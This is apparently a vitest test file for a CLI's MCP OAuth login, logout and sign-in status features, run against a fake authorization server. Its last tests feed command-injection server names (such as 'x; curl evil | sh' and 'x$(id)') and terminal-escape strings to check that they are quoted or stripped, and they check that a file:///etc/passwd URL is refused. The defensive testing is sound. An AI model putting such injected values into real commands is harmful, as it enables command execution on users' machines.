/**
 * The product side of MCP OAuth: `robota mcp login` finds the server a session would connect to,
 * runs the sign-in without a real browser, and keeps the credential owner-only under the user's
 * Robota home; a session then sends it, and never connects an OAuth server without it.
 */

import { request as httpRequest } from 'node:http';
import { PassThrough } from 'node:stream';
import { createHash } from 'node:crypto';
import {
  mkdirSync,
  mkdtempSync,
  readdirSync,
  realpathSync,
  rmSync,
  statSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { afterEach, describe, expect, it } from 'vitest';

import { browserCommand, openInBrowser } from '../browser-opener.js';
import { HiddenPromptTooLongError, promptHiddenLine } from '../hidden-prompt.js';
import { securityIdentity } from '@robota-sdk/agent-mcp';

import { createMcpClientComposition } from '../mcp-client-composition.js';
import { resolveMcpDefinitions } from '../mcp-definition-sources.js';
import { runMcpLoginCommand, runMcpLogoutCommand } from '../mcp-login-command.js';
import {
  createMcpOAuthHost,
  formatMcpOAuthNotice,
  mcpCredentialDirectory,
} from '../mcp-oauth-host.js';
import { createRobotaUserSettingsSources } from '../../product/robota-user-settings.js';

import type { IMCPActivationRequest } from '@robota-sdk/agent-mcp';
import type { IMcpLoginCommandDeps } from '../mcp-login-command.js';

const MCP_URL = 'https://mcp.example.test/mcp';
const AS_URL = 'https://auth.example.test/';

const roots: string[] = [];
afterEach(() => {
  for (const root of roots.splice(0)) rmSync(root, { recursive: true, force: true });
});

/** A temporary HOME holding a user settings file with these servers. */
function home(servers: Record<string, unknown>): string {
  const root = realpathSync(mkdtempSync(join(tmpdir(), 'robota-mcp-oauth-home-')));
  roots.push(root);
  mkdirSync(join(root, '.robota'), { recursive: true });
  writeFileSync(join(root, '.robota', 'settings.json'), JSON.stringify({ mcpServers: servers }));
  return root;
}

function json(body: unknown, status = 200): Response {
  return new Response(JSON.stringify(body), {
    status,
    headers: { 'content-type': 'application/json' },
  });
}

/** Just enough authorization server for one sign-in; the "browser" approves and follows. */
function fakeAuthorizationServer(revocation: 'down' | 'refresh-only' = 'down') {
  const codes = new Map<string, string>();
  const revocations: URLSearchParams[] = [];
  const fetch = (async (input: string | URL, init?: RequestInit) => {
    const url = new URL(String(input));
    const body = init?.body === undefined || init.body === null ? '' : String(init.body);
    if (url.href === 'https://auth.example.test/revoke') {
      const form = new URLSearchParams(body);
      revocations.push(form);
      if (revocation === 'refresh-only') {
        return form.get('token_type_hint') === 'refresh_token'
          ? new Response(null, { status: 200 })
          : json({ error: 'unsupported_token_type', error_description: 'leaked-text' }, 400);
      }
      return json({ error: 'temporarily_unavailable', error_description: 'leaked-text' }, 503);
    }
    if (url.href === 'https://mcp.example.test/.well-known/oauth-protected-resource/mcp') {
      return json({ resource: MCP_URL, authorization_servers: [AS_URL] });
    }
    if (url.href === 'https://auth.example.test/.well-known/oauth-authorization-server') {
      return json({
        issuer: AS_URL,
        authorization_endpoint: 'https://auth.example.test/authorize',
        token_endpoint: 'https://auth.example.test/token',
        registration_endpoint: 'https://auth.example.test/register',
        revocation_endpoint: 'https://auth.example.test/revoke',
        response_types_supported: ['code'],
        code_challenge_methods_supported: ['S256'],
      });
    }
    if (url.href === 'https://auth.example.test/register') {
      return json({ ...JSON.parse(body), client_id: 'dynamic-client' }, 201);
    }
    if (url.href === 'https://auth.example.test/token') {
      const form = new URLSearchParams(body);
      const challenge = codes.get(form.get('code') ?? '');
      const verified =
        challenge !== undefined &&
        createHash('sha256')
          .update(form.get('code_verifier') ?? '')
          .digest('base64url') === challenge;
      if (!verified) return json({ error: 'invalid_grant' }, 400);
      return json({
        access_token: 'access-token-value',
        refresh_token: 'refresh-token-value',
        token_type: 'Bearer',
        expires_in: 3600,
      });
    }
    return json({}, 404);
  }) as typeof globalThis.fetch;
  /** Approve as the user would; the redirect the browser is then sent to. */
  const approve = (authorization: URL): URL => {
    codes.set('the-code', authorization.searchParams.get('code_challenge') ?? '');
    const redirect = new URL(authorization.searchParams.get('redirect_uri') ?? '');
    redirect.searchParams.set('code', 'the-code');
    redirect.searchParams.set('state', authorization.searchParams.get('state') ?? '');
    return redirect;
  };
  const browse = async (authorization: URL): Promise<void> => {
    const request = httpRequest(approve(authorization), (response) => response.resume());
    request.on('error', () => undefined);
    request.end();
  };
  return { fetch, lookup: async () => ['203.0.113.10'], browse, approve, revocations };
}

type TFakeAuthorizationServer = ReturnType<typeof fakeAuthorizationServer>;

function commandDeps(
  userHome: string,
  server: TFakeAuthorizationServer,
  out: string[],
  err: string[],
  opened: URL[],
): IMcpLoginCommandDeps {
  return {
    settingsSources: createRobotaUserSettingsSources(userHome),
    env: { HOME: userHome },
    stdout: (text) => out.push(text),
    stderr: (text) => err.push(text),
    openBrowser: async (url) => {
      opened.push(url);
      await server.browse(url);
    },
    network: { fetch: server.fetch, lookup: server.lookup },
    credentialDirectory: mcpCredentialDirectory(userHome),
    callbackTimeoutMs: 5_000,
  };
}

async function login(
  args: readonly string[],
  userHome: string,
  extra: Partial<IMcpLoginCommandDeps> = {},
  server: TFakeAuthorizationServer = fakeAuthorizationServer(),
) {
  const out: string[] = [];
  const err: string[] = [];
  const opened: URL[] = [];
  const code = await runMcpLoginCommand(args, {
    ...commandDeps(userHome, server, out, err, opened),
    ...extra,
  });
  return { code, out: out.join(''), err: err.join(''), opened };
}

async function logout(
  args: readonly string[],
  userHome: string,
  server: TFakeAuthorizationServer = fakeAuthorizationServer(),
) {
  const out: string[] = [];
  const err: string[] = [];
  const code = await runMcpLogoutCommand(args, commandDeps(userHome, server, out, err, []));
  return { code, out: out.join(''), err: err.join('') };
}

const credentialFiles = (userHome: string): string[] =>
  readdirSync(join(userHome, '.robota', 'mcp-credentials')).filter((name) =>
    name.endsWith('.json'),
  );

describe('robota mcp login', () => {
  it('signs in and stores the credential owner-only under ~/.robota/mcp-credentials', async () => {
    const userHome = home({ files: { type: 'http', url: MCP_URL, oauth: {} } });
    const result = await login(['files'], userHome);
    expect(result.err).toBe('');
    expect(result.code).toBe(0);
    expect(result.out).toContain('Signed in to MCP server "files"');
    expect(result.opened[0]?.protocol).toBe('https:');
    const directory = join(userHome, '.robota', 'mcp-credentials');
    const files = readdirSync(directory).filter((name) => name.endsWith('.json'));
    expect(files).toHaveLength(1);
    if (process.platform !== 'win32') {
      expect(statSync(directory).mode & 0o777).toBe(0o700);
      expect(statSync(join(directory, files[0]!)).mode & 0o777).toBe(0o600);
    }
    // Nothing a sign-in obtained is printed.
    expect(`${result.out}${result.err}`).not.toMatch(
      /access-token-value|refresh-token-value|the-code/,
    );
  });

  it('refuses a server that does not declare oauth, an unknown one, and a bad invocation', async () => {
    const userHome = home({ plain: { type: 'http', url: MCP_URL } });
    expect((await login(['plain'], userHome)).err).toContain('does not declare `oauth`');
    expect((await login(['missing'], userHome)).err).toContain('No MCP server named "missing"');
    expect((await login([], userHome)).err).toContain('Usage: robota mcp login');
    expect((await login(['a', 'b'], userHome)).code).toBe(1);
  });

  it('asks for a client secret only for a pre-registered client, and never echoes it', async () => {
    const dynamic = home({ files: { type: 'http', url: MCP_URL, oauth: {} } });
    let asked = 0;
    const refused = await login(['files', '--client-secret'], dynamic, {
      promptSecret: async () => {
        asked += 1;
        return 'client-secret-value';
      },
    });
    expect(refused.code).toBe(1);
    expect(asked).toBe(0);
    expect(refused.err).toContain('oauth.clientId');

    const port = 40_000 + Math.floor(Math.random() * 20_000);
    const registered = home({
      files: { type: 'http', url: MCP_URL, oauth: { clientId: 'robota', callbackPort: port } },
    });
    const result = await login(['files', '--client-secret'], registered, {
      promptSecret: async () => 'client-secret-value',
    });
    expect(result.code).toBe(0);
    expect(`${result.out}${result.err}`).not.toContain('client-secret-value');
  });

  it('reports a failed sign-in by reason only', async () => {
    const userHome = home({
      files: { type: 'http', url: 'https://mcp.example.test/other', oauth: {} },
    });
    const result = await login(['files'], userHome);
    expect(result.code).toBe(1);
    expect(result.err).toBe('Sign-in to MCP server "files" failed (discovery-failed).\n');
  });
});

describe('robota mcp login --no-browser', () => {
  const authorizationUrl = (out: string[]): URL =>
    new URL(/https:\/\/auth\.example\.test\/authorize\S+/.exec(out.join(''))![0]);

  it('prints the URL, opens no browser, and accepts the pasted redirect', async () => {
    const userHome = home({ files: { type: 'http', url: MCP_URL, oauth: {} } });
    const server = fakeAuthorizationServer();
    const out: string[] = [];
    const result = await login(
      ['files', '--no-browser'],
      userHome,
      {
        stdout: (text) => out.push(text),
        promptRedirect: async () => server.approve(authorizationUrl(out)).href,
      },
      server,
    );
    expect(result.err).toBe('');
    expect(result.code).toBe(0);
    expect(result.opened).toEqual([]);
    expect(out.join('')).toMatch(/open this URL in a browser/);
    expect(out.join('')).toMatch(/paste it here/);
    expect(out.join('')).toContain('Signed in to MCP server "files"');
    expect(out.join('')).not.toMatch(/access-token-value|refresh-token-value|the-code/);
    expect(credentialFiles(userHome)).toHaveLength(1);
  });

  it('refuses a pasted redirect that belongs to another sign-in, and stores nothing', async () => {
    const userHome = home({ files: { type: 'http', url: MCP_URL, oauth: {} } });
    const server = fakeAuthorizationServer();
    const out: string[] = [];
    const result = await login(
      ['files', '--no-browser'],
      userHome,
      {
        stdout: (text) => out.push(text),
        promptRedirect: async () => {
          const redirect = server.approve(authorizationUrl(out));
          redirect.searchParams.set('state', 'forged');
          return redirect.href;
        },
      },
      server,
    );
    expect(result.code).toBe(1);
    expect(result.err).toBe('Sign-in to MCP server "files" failed (callback-invalid).\n');
    expect(readdirSync(join(userHome, '.robota'))).not.toContain('mcp-credentials');
  });
});

describe('the pasted-redirect prompt', () => {
  it('reports an over-long paste as too long, not as cancelled', async () => {
    const userHome = home({ files: { type: 'http', url: MCP_URL, oauth: {} } });
    const result = await login(['files', '--no-browser'], userHome, {
      promptRedirect: async () => {
        throw new HiddenPromptTooLongError();
      },
    });
    expect(result.code).toBe(1);
    expect(result.err).toBe('Sign-in to MCP server "files" failed (redirect-too-long).\n');
  });

  it('stops reading when its signal aborts, and refuses a line over its limit', async () => {
    const streams = () => ({ input: new PassThrough(), output: new PassThrough() });
    const controller = new AbortController();
    const waiting = promptHiddenLine('Redirect URL: ', streams(), { signal: controller.signal });
    controller.abort();
    await expect(waiting).rejects.toThrow('Cancelled.');

    const long = streams();
    const tooLong = promptHiddenLine('Redirect URL: ', long, { maxLength: 8 });
    long.input.write('https://example.test/\n');
    await expect(tooLong).rejects.toBeInstanceOf(HiddenPromptTooLongError);
  });
});

describe('robota mcp logout', () => {
  it('deletes the credential even when revocation fails, and says so by reason only', async () => {
    const userHome = home({ files: { type: 'http', url: MCP_URL, oauth: {} } });
    expect((await login(['files'], userHome)).code).toBe(0);
    const server = fakeAuthorizationServer();
    const result = await logout(['files'], userHome, server);
    expect(result.err).toBe('');
    expect(result.code).toBe(0);
    expect(result.out).toBe(
      'Signed out of MCP server "files". Token revocation failed (revocation-failed); ' +
        'the tokens stay valid until they expire.\n',
    );
    expect(credentialFiles(userHome)).toEqual([]);
    expect(server.revocations.map((form) => form.get('token_type_hint'))).toEqual([
      'refresh_token',
      'access_token',
    ]);
    expect(result.out).not.toMatch(/access-token-value|refresh-token-value|leaked-text/);

    const again = await logout(['files'], userHome);
    expect(again.out).toContain('Not signed in to MCP server "files"');
  });

  it('says which token was revoked when the server revokes only one', async () => {
    const userHome = home({ files: { type: 'http', url: MCP_URL, oauth: {} } });
    expect((await login(['files'], userHome)).code).toBe(0);
    const result = await logout(['files'], userHome, fakeAuthorizationServer('refresh-only'));
    expect(result.out).toBe(
      'Signed out of MCP server "files". The refresh token was revoked. The access token was not ' +
        '(token-type-not-revocable) and stays valid until it expires.\n',
    );
  });

  it('refuses a server that does not declare oauth, and a bad invocation', async () => {
    const userHome = home({ plain: { type: 'http', url: MCP_URL } });
    expect((await logout(['plain'], userHome)).err).toContain('does not declare `oauth`');
    expect((await logout([], userHome)).err).toContain('Usage: robota mcp logout');
  });
});

describe('/mcp sign-in state and sign-out', () => {
  it('shows each state without a token, and signs out through the session', async () => {
    const userHome = home({ files: { type: 'http', url: MCP_URL, oauth: {} } });
    const { entries } = resolveMcpDefinitions(createRobotaUserSettingsSources(userHome), {
      HOME: userHome,
    });
    const server = fakeAuthorizationServer();
    const host = createMcpOAuthHost({
      network: { fetch: server.fetch, lookup: server.lookup },
      reportDiagnostic: () => undefined,
      directory: mcpCredentialDirectory(userHome),
    });
    const composition = createMcpClientComposition({
      resolvedEntries: entries,
      oauth: host,
      reportDiagnostic: () => undefined,
    });
    const port = composition.activationAdapter;
    await expect(port.oauthStatus?.()).resolves.toEqual([
      { serverId: 'files', state: 'signed-out' },
    ]);

    // A session told to sign in says so, rather than just "signed out".
    const entry = entries.find((candidate) => candidate.name === 'files')!;
    const request = {
      serverId: 'files',
      securityIdentity: securityIdentity(entry),
    } as IMCPActivationRequest;
    const authenticator = host.authenticatorFor(request, entry.definition!);
    await expect(
      authenticator.authorize({ ...request, url: new URL(MCP_URL) }),
    ).rejects.toMatchObject({ reason: 'login-required' });
    authenticator.close();
    await expect(port.oauthStatus?.()).resolves.toEqual([
      { serverId: 'files', state: 'sign-in-required' },
    ]);

    expect((await login(['files'], userHome)).code).toBe(0);
    const signedIn = await port.oauthStatus?.();
    expect(signedIn).toEqual([{ serverId: 'files', state: 'signed-in' }]);
    expect(JSON.stringify(signedIn)).not.toMatch(/token-value/);

    await expect(port.oauthLogout?.('files')).resolves.toMatchObject({
      serverId: 'files',
      removed: true,
      revocation: 'failed',
      revocationFailure: 'revocation-failed',
    });
    expect(credentialFiles(userHome)).toEqual([]);
    await expect(port.oauthStatus?.()).resolves.toEqual([
      { serverId: 'files', state: 'signed-out' },
    ]);
    await expect(port.oauthLogout?.('missing')).rejects.toThrow();
    await composition.shutdown();
  });
});

describe('MCP OAuth notices and browser', () => {
  it('tells the user how to sign in, and which scope is missing', () => {
    expect(formatMcpOAuthNotice({ kind: 'login-required', serverId: 'files' })).toContain(
      'run robota mcp login files',
    );
    expect(
      formatMcpOAuthNotice({ kind: 'insufficient-scope', serverId: 'files', scope: 'files:write' }),
    ).toContain('"files:write"');
  });

  it('quotes a hostile server name in the sign-in command, or leaves it out', () => {
    const notice = (serverId: string): string =>
      formatMcpOAuthNotice({ kind: 'login-required', serverId });
    expect(notice('x; curl evil | sh')).toContain("run robota mcp login 'x; curl evil | sh'");
    expect(notice('x$(id)')).toContain("run robota mcp login 'x$(id)'");
    expect(notice('x`id`')).toContain("run robota mcp login 'x`id`'");
    for (const name of ['x\nrun robota mcp login good', 'x\u001b[2Kgood', 'x\u202egood']) {
      expect(notice(name)).toContain('run robota mcp login <server>');
      for (const hidden of ['\n', '\u001b', '\u202e', 'good']) {
        expect(notice(name)).not.toContain(hidden);
      }
    }
  });

  it('opens only https URLs, by argv, with each platform opener', async () => {
    const url = new URL('https://auth.example.test/authorize?a=1&b=2');
    expect(browserCommand(url, 'darwin')).toEqual({ command: 'open', args: [url.href] });
    expect(browserCommand(url, 'linux')).toEqual({ command: 'xdg-open', args: [url.href] });
    expect(browserCommand(url, 'win32')).toEqual({
      command: 'rundll32',
      args: ['url.dll,FileProtocolHandler', url.href],
    });
    expect(() => browserCommand(new URL('http://auth.example.test/'), 'linux')).toThrow();
    expect(() => browserCommand(new URL('file:///etc/passwd'), 'linux')).toThrow();
    const calls: [string, readonly string[]][] = [];
    await openInBrowser(url, {
      platform: 'linux',
      execFile: (command, args, callback) => {
        calls.push([command, args]);
        callback(null);
      },
    });
    expect(calls).toEqual([['xdg-open', [url.href]]]);
  });
});
